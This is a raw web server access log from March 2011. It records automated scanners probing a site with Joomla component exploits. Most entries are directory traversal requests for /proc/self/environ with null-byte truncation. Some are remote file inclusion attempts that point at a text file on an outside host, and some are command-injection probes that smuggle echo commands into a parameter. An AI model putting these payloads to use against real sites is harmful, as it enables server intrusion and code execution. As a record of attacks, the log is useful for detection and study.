76.97.16.122 - - [21/Mar/2011:06:00:01 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:00:19 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:01:06 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:10 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:14 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:14 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:21 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:30 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:30 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:30 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:30 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:30 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:31 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:32 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:32 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:35 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:47 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:02:50 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
67.210.98.105 - - [21/Mar/2011:06:03:20 +0900] "GET /access_log//index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 227
67.210.98.105 - - [21/Mar/2011:06:03:21 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
95.229.208.133 - - [21/Mar/2011:06:03:26 +0900] "GET /access_log.last//index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
76.97.16.122 - - [21/Mar/2011:06:07:50 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:07:53 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:07:56 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:08:42 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
95.229.208.133 - - [21/Mar/2011:06:12:07 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:13:14 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:13:17 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:13:20 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:13:23 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
216.246.89.162 - - [21/Mar/2011:06:13:27 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:13:31 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:13:43 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:13:46 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:13:49 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:13:52 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:13:56 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:13:59 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:13:59 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:14:00 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:14:01 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
67.210.98.105 - - [21/Mar/2011:06:14:02 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:14:02 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
216.246.89.162 - - [21/Mar/2011:06:14:21 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:16:52 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:16:58 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:17:01 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:17:36 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:18:16 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:18:27 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:18:57 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:19:01 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
95.229.208.133 - - [21/Mar/2011:06:21:38 +0900] "GET /access_log.last//index.php?option=com_sbsfile&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
95.229.208.133 - - [21/Mar/2011:06:21:40 +0900] "GET //index.php?option=com_sbsfile&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:26:34 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:26:44 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:26:50 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:26:52 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:26:52 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:26:53 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:26:53 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:26:58 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:26:58 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:26:59 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:26:59 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:27:02 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:27:11 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:27:14 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:06:27:21 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
95.229.208.133 - - [21/Mar/2011:06:28:41 +0900] "GET /access_log.last//index.php?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
95.229.208.133 - - [21/Mar/2011:06:28:43 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
216.246.89.162 - - [21/Mar/2011:06:28:48 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
95.229.208.133 - - [21/Mar/2011:06:30:09 +0900] "GET /access_log.last//index.php?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
95.229.208.133 - - [21/Mar/2011:06:30:12 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
95.229.208.133 - - [21/Mar/2011:06:31:05 +0900] "GET /access_log.last//index.php?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
95.229.208.133 - - [21/Mar/2011:06:31:06 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
87.118.100.70 - - [21/Mar/2011:06:31:41 +0900] "GET /access_log.last HTTP/1.0" 200 622592
93.158.151.24 - - [21/Mar/2011:06:32:45 +0900] "GET /error_log HTTP/1.1" 200 9620
95.229.208.133 - - [21/Mar/2011:06:34:20 +0900] "GET /access_log.last//index.php?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
95.229.208.133 - - [21/Mar/2011:06:34:22 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
95.229.208.133 - - [21/Mar/2011:06:36:05 +0900] "GET /access_log.last//index.php?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
95.229.208.133 - - [21/Mar/2011:06:36:08 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:36:12 +0900] "GET //index.php?option=com_sbsfile&controller=http://www.roundabouthouse.co.uk/id/ipuls/Ckrid1.txt?? HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:36:12 +0900] "GET /access_log.last//index.php?option=com_sbsfile&controller=http://www.roundabouthouse.co.uk/id/ipuls/Ckrid1.txt?? HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:36:12 +0900] "GET //index.php?option=com_sbsfile&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:36:12 +0900] "GET /access_log.last//index.php?option=com_sbsfile&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 232
95.229.208.133 - - [21/Mar/2011:06:36:16 +0900] "GET /access_log.last//index.php?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
95.229.208.133 - - [21/Mar/2011:06:36:19 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
213.251.169.85 - - [21/Mar/2011:06:37:09 +0900] "GET /index.php?option=com_travelbook&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
62.212.74.150 - - [21/Mar/2011:06:37:10 +0900] "GET /index.php?option=com_travelbook&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.121.147.225 - - [21/Mar/2011:06:37:32 +0900] "GET /access_log.last/index.php?option=com_travelbook&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
91.121.147.225 - - [21/Mar/2011:06:37:33 +0900] "GET /index.php?option=com_travelbook&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
62.212.74.150 - - [21/Mar/2011:06:37:48 +0900] "GET /index.php?option=com_travelbook&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
213.251.169.85 - - [21/Mar/2011:06:38:10 +0900] "GET /index.php?option=com_travelbook&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.121.147.225 - - [21/Mar/2011:06:38:10 +0900] "GET /access_log.last/index.php?option=com_travelbook&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
91.121.147.225 - - [21/Mar/2011:06:38:10 +0900] "GET /index.php?option=com_travelbook&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.121.147.225 - - [21/Mar/2011:06:38:13 +0900] "GET /index.php?option=com_travelbook&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
94.199.178.9 - - [21/Mar/2011:06:38:39 +0900] "GET /?option=com_jvehicles&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
91.121.147.225 - - [21/Mar/2011:06:38:49 +0900] "GET /access_log/index.php?option=com_travelbook&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 226
174.121.216.196 - - [21/Mar/2011:06:40:46 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
216.119.135.66 - - [21/Mar/2011:06:42:24 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
216.119.135.66 - - [21/Mar/2011:06:42:33 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
216.119.135.66 - - [21/Mar/2011:06:42:33 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
91.121.147.225 - - [21/Mar/2011:06:42:38 +0900] "GET /access_log.last/index.php?option=com_travelbook&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
91.121.147.225 - - [21/Mar/2011:06:42:39 +0900] "GET /index.php?option=com_travelbook&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
211.234.100.9 - - [21/Mar/2011:06:42:46 +0900] "GET /access_log//components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path= HTTP/1.1" 404 267
211.234.100.9 - - [21/Mar/2011:06:42:47 +0900] "GET //components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path= HTTP/1.1" 404 256
216.119.135.66 - - [21/Mar/2011:06:42:54 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
216.246.89.162 - - [21/Mar/2011:06:43:35 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
211.234.100.9 - - [21/Mar/2011:06:43:39 +0900] "GET /access_log//components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path= HTTP/1.1" 404 267
211.234.100.9 - - [21/Mar/2011:06:43:40 +0900] "GET //components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path= HTTP/1.1" 404 256
216.119.135.66 - - [21/Mar/2011:06:43:44 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
174.121.216.196 - - [21/Mar/2011:06:44:07 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
81.215.243.96 - - [21/Mar/2011:06:44:27 +0900] "GET /administrator/index.php HTTP/1.1" 404 229
206.188.206.78 - - [21/Mar/2011:06:44:48 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
174.121.216.196 - - [21/Mar/2011:06:44:55 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:45:02 +0900] "GET //index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:45:02 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:45:02 +0900] "GET //index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:45:02 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:45:02 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:45:02 +0900] "GET //index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:45:02 +0900] "GET //index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:45:02 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:45:02 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:45:02 +0900] "GET //index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:45:03 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:45:03 +0900] "GET //index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:45:03 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:45:03 +0900] "GET //index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 216
207.46.13.48 - - [21/Mar/2011:06:45:03 +0900] "GET /robots.txt HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:45:08 +0900] "GET //index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:45:08 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:45:18 +0900] "GET //index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:45:18 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:45:18 +0900] "GET //index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:45:18 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:45:18 +0900] "GET //index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:45:18 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:45:19 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:45:19 +0900] "GET //index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 216
211.234.100.9 - - [21/Mar/2011:06:45:29 +0900] "GET /access_log//components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path= HTTP/1.1" 404 267
211.234.100.9 - - [21/Mar/2011:06:45:30 +0900] "GET //components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path= HTTP/1.1" 404 256
207.46.13.48 - - [21/Mar/2011:06:45:50 +0900] "GET /?S=D HTTP/1.1" 200 954
206.188.206.78 - - [21/Mar/2011:06:46:04 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
174.121.216.196 - - [21/Mar/2011:06:47:06 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
174.121.216.196 - - [21/Mar/2011:06:47:29 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
95.229.208.133 - - [21/Mar/2011:06:48:12 +0900] "GET /access_log.last//index.php?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
95.229.208.133 - - [21/Mar/2011:06:48:13 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
206.188.206.78 - - [21/Mar/2011:06:48:18 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
206.188.206.78 - - [21/Mar/2011:06:48:59 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
174.121.216.196 - - [21/Mar/2011:06:49:29 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
174.121.216.196 - - [21/Mar/2011:06:49:57 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
213.251.169.85 - - [21/Mar/2011:06:51:16 +0900] "GET /access_log.last/index.php?option=com_travelbook&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
